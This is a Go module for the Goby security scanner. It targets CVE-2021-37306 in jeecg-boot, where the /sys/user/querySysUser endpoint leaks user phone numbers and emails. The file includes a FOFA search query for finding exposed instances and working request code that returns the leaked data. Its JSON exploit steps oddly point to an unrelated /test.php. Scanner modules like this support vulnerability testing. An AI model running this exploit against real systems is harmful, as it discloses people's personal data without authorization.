package exploits

import (
	"strconv"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "jeecg-boot /jeecg-boot/sys/user/querySysUser  Information Disclosure Vulnerability(CVE-2021-37306)",
    "Description": "<p>JeecgBoot is a low code platform based on BPM. jeecg-boot &lt;= 2.4.5 API interface /sys/user/querySysUser discloses sensitive information, such as email, phone, and user names in the enumeration system.The attacker reads the sensitive information of the system by constructing a special URL address.</p>",
    "Product": "Jeecgboot-Ent-Rapid-Dev-Platform",
    "Homepage": "http://www.jeecg.com/",
    "DisclosureDate": "2021-07-21",
    "PostTime": "2024-07-11",
    "Author": "1977250845@qq.com",
    "FofaQuery": "title=\"Jeecg\" && body=\"jeecg-boot\"",
    "GobyQuery": "title=\"Jeecg\" && body=\"jeecg-boot\"",
    "Level": "0",
    "Impact": "<p>jeecg-boot &lt;= 2.4.5 API interface /sys/user/querySysUser discloses sensitive information, such as email, phone, and user names in the enumeration system.The attacker reads the sensitive information of the system by constructing a special URL address.</p>",
    "Recommendation": "<p>Upgrade to a newer version</p>",
    "References": [
        "https://github.com/jeecgboot/JeecgBoot/issues/2794"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "userName",
            "type": "input",
            "value": "admin",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/jeecg-boot/sys/user/querySysUser?username=admin",
                "follow_redirect": true,
                "header": {
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "phone",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        "CVE-2021-37306"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "jeecg-boot /jeecg-boot/sys/user/querySysUser 信息泄露漏洞（CVE-2021-37306）",
            "Product": "JeecgBoot-企业级快速开发平台",
            "Description": "<p>JeecgBoot是一款基于BPM的低代码平台。jeecg-boot &lt;= 2.4.5版本中API 接口/sys/user/querySysUser存在泄露敏感信息，如电子邮件、电话、枚举系统中的用户名。攻击者通过构造特殊URL地址，读取系统敏感信息。<br></p>",
            "Recommendation": "<p>升级至更新版本</p>",
            "Impact": "<p>jeecg-boot &lt;= 2.4.5版本中API 接口/sys/user/querySysUser存在泄露敏感信息，如电子邮件、电话、枚举系统中的用户名。攻击者通过构造特殊URL地址，读取系统敏感信息。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "jeecg-boot /jeecg-boot/sys/user/querySysUser  Information Disclosure Vulnerability(CVE-2021-37306)",
            "Product": "Jeecgboot-Ent-Rapid-Dev-Platform",
            "Description": "<p>JeecgBoot is a low code platform based on BPM. jeecg-boot &lt;= 2.4.5 API interface /sys/user/querySysUser discloses sensitive information, such as email, phone, and user names in the enumeration system.The attacker reads the sensitive information of the system by constructing a special URL address.<br></p>",
            "Recommendation": "<p>Upgrade to a newer version<br></p>",
            "Impact": "<p>jeecg-boot &lt;= 2.4.5 API interface /sys/user/querySysUser discloses sensitive information, such as email, phone, and user names in the enumeration system.The attacker reads the sensitive information of the system by constructing a special URL address.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10969"
}`


	setPayloadRequestDAOSBBC128U43HE := func (hostInfo *httpclient.FixUrl,name string)(string,string,error,int)  {
		requestResult :=""
		url :="/jeecg-boot/sys/user/querySysUser?username="+name
		makeRequest := httpclient.NewGetRequestConfig(url)
		makeRequest.VerifyTls = false
		makeRequest.Timeout = 10
		makeRequest.FollowRedirect = false
		makeRequest.Header.Store("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
		if resp,err := httpclient.DoHttpRequest(hostInfo,makeRequest); err ==nil{
			requestResult=resp.RawBody
			return requestResult,url,nil,resp.StatusCode
		}else{
			return requestResult,url,err,500
		}
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,

		func(exp *jsonvul.JsonVul,hostInfo *httpclient.FixUrl,ss *scanconfig.SingleScanConfig) bool{
			runPayload := setPayloadRequestDAOSBBC128U43HE
			text := "admin"
			pocResult,pocUrl,err,statusCode := runPayload(hostInfo,text)
			if (err != nil){
				return false
			}
			if  (statusCode !=200){
				return false
			}
			if strings.Contains(pocResult,"phone"){
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult{
			runPayload := setPayloadRequestDAOSBBC128U43HE
			file := goutils.B2S(ss.Params["userName"])
			pocResult,_,err,statusCode:= runPayload(expResult.HostInfo,file)
			if err != nil{
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			if statusCode !=200 {
				expResult.Success = false
				expResult.OutputType = "html"
				errorInfo := strconv.Itoa(statusCode)
				expResult.Output = "error!"+"\nhttpSatutsCode:"+errorInfo
				return expResult
			}
			if len(pocResult) > 0 {
				expResult.Success = true
				expResult.OutputType = "html"
				expResult.Output = pocResult
			} else {
				expResult.Success = false
				expResult.Output = "content is null!"
			}
			return expResult
		},
	))
}